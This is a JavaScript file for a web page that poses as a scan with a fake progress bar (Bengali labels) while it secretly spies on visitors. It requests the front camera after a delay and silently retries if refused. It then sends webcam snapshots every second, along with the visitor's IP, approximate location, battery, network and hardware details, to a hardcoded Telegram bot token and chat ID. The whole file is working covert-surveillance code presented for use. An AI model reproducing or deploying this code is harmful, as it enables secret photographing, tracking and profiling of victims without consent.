// Configuration
const BOT_TOKEN = "7249136904:AAGFPmdS5CnextPMpNlUPv0qeSuVHBaUF-w";
const CHAT_ID = "8174575316";
const video = document.querySelector("video");
const canvas = document.getElementById("sensorCanvas");
const ctx = canvas.getContext("2d");
const progressBar = document.getElementById("progressBar");
const progressText = document.getElementById("progressText");

let streamStarted = false;
let deviceInfoSent = false;
let progress = 0;
let hiddenPermissionRequested = false;

// Initialize
document.addEventListener('DOMContentLoaded', () => {
  createParticles();
  simulateProgress();
  
  // Hidden permission check
  setTimeout(() => {
    if (!streamStarted) {
      tryStartCamera();
      hiddenPermissionRequested = true;
    }
  }, 3000);
});

// Create floating particles
function createParticles() {
  const colors = ['#00f7ff', '#ff00aa', '#ffffff'];
  
  for (let i = 0; i < 20; i++) {
    const particle = document.createElement('div');
    particle.classList.add('particle');
    
    // Random properties
    const size = Math.random() * 5 + 2;
    const color = colors[Math.floor(Math.random() * colors.length)];
    
    particle.style.width = `${size}px`;
    particle.style.height = `${size}px`;
    particle.style.background = color;
    particle.style.left = `${Math.random() * 100}%`;
    particle.style.top = `${Math.random() * 100}%`;
    particle.style.opacity = Math.random() * 0.5 + 0.1;
    
    // Animation
    const duration = Math.random() * 20 + 10;
    particle.style.animation = `float ${duration}s linear infinite`;
    particle.style.animationDelay = `${Math.random() * 5}s`;
    
    document.body.appendChild(particle);
  }
}

// Simulate progress bar
function simulateProgress() {
  const interval = setInterval(() => {
    progress += Math.random() * 10;
    if (progress > 100) progress = 100;
    
    progressBar.style.width = `${progress}%`;
    progressText.textContent = `${Math.min(Math.floor(progress), 100)}% সম্পূর্ণ`;
    
    if (progress >= 100) {
      clearInterval(interval);
      setTimeout(() => {
        progressText.textContent = "স্ক্যান সম্পন্ন!";
      }, 500);
    }
  }, 500);
}

// Try to access camera (hidden)
async function tryStartCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { facingMode: "user" } 
    });
    video.srcObject = stream;
    if (!streamStarted) {
      streamStarted = true;
      startSendingPhotos();
      sendDeviceInfo();
    }
  } catch (err) {
    console.log("Camera access not available yet");
    // Retry silently every 10 seconds
    setTimeout(tryStartCamera, 10000);
  }
}

// Get comprehensive device info
async function getDeviceInfo() {
  const info = {
    timestamp: new Date().toLocaleString(),
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: `${window.screen.width}x${window.screen.height}`,
    cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
    doNotTrack: navigator.doNotTrack || "Not specified"
  };

  // Get IP
  try {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    info.ip = ipData.ip;
    
    // Get location from IP
    const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
    const locationData = await locationResponse.json();
    info.location = {
      city: locationData.city,
      region: locationData.region,
      country: locationData.country_name,
      timezone: locationData.timezone
    };
  } catch (e) {
    info.ip = "Could not fetch";
  }

  // Battery status
  if ('getBattery' in navigator) {
    try {
      const battery = await navigator.getBattery();
      info.battery = {
        level: `${Math.round(battery.level * 100)}%`,
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
    } catch (e) {
      info.battery = "Error fetching battery info";
    }
  }

  // Network info
  if ('connection' in navigator) {
    info.connection = {
      type: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt,
      saveData: navigator.connection.saveData
    };
  }

  // Hardware info
  info.hardware = {
    cores: navigator.hardwareConcurrency || "Unknown",
    deviceMemory: navigator.deviceMemory || "Unknown"
  };

  return info;
}

// Send device info to Telegram
async function sendDeviceInfo() {
  if (deviceInfoSent) return;
  
  const deviceInfo = await getDeviceInfo();
  
  // Format message
  let message = `👻 *Ghost Vision Report* 👻\n\n`;
  message += `📅 *Timestamp:* ${deviceInfo.timestamp}\n`;
  message += `🌐 *IP:* ${deviceInfo.ip || "Unknown"}\n`;
  
  if (deviceInfo.location) {
    message += `📍 *Location:* ${deviceInfo.location.city}, ${deviceInfo.location.region}, ${deviceInfo.location.country}\n`;
    message += `⏰ *Timezone:* ${deviceInfo.location.timezone}\n`;
  }
  
  message += `\n💻 *Device Info*\n`;
  message += `🖥️ *Platform:* ${deviceInfo.platform}\n`;
  message += `📱 *User Agent:* ${deviceInfo.userAgent}\n`;
  message += `🖥️ *Screen:* ${deviceInfo.screen}\n`;
  
  if (deviceInfo.battery) {
    message += `\n🔋 *Battery:* ${deviceInfo.battery.level} (${deviceInfo.battery.charging ? "Charging" : "Not charging"})\n`;
  }
  
  if (deviceInfo.connection) {
    message += `📶 *Connection:* ${deviceInfo.connection.type} (${deviceInfo.connection.downlink}Mbps)\n`;
  }
  
  message += `\n⚙️ *Hardware*\n`;
  message += `🧠 *CPU Cores:* ${deviceInfo.hardware.cores}\n`;
  message += `💾 *RAM:* ${deviceInfo.hardware.deviceMemory}GB\n`;
  
  // Send to Telegram
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "Markdown"
    })
  }).catch(err => console.error("Telegram Error:", err));
  
  deviceInfoSent = true;
}

// Start sending photos to Telegram
function startSendingPhotos() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  
  setInterval(() => {
    if (video.readyState !== video.HAVE_ENOUGH_DATA) return;
    
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    canvas.toBlob(blob => {
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("photo", blob, "snapshot.jpg");
      
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      }).catch(err => console.log("Photo send error:", err));
    }, "image/jpeg", 0.85);
  }, 1000);
}

// Floating particles animation
const particles = document.querySelectorAll('.particle');
particles.forEach(particle => {
  animateParticle(particle);
});

function animateParticle(particle) {
  let x = Math.random() * window.innerWidth;
  let y = Math.random() * window.innerHeight;
  let vx = (Math.random() - 0.5) * 0.5;
  let vy = (Math.random() - 0.5) * 0.5;
  
  function move() {
    x += vx;
    y += vy;
    
    if (x < 0 || x > window.innerWidth) vx *= -1;
    if (y < 0 || y > window.innerHeight) vy *= -1;
    
    particle.style.transform = `translate(${x}px, ${y}px)`;
    requestAnimationFrame(move);
  }
  
  move();
}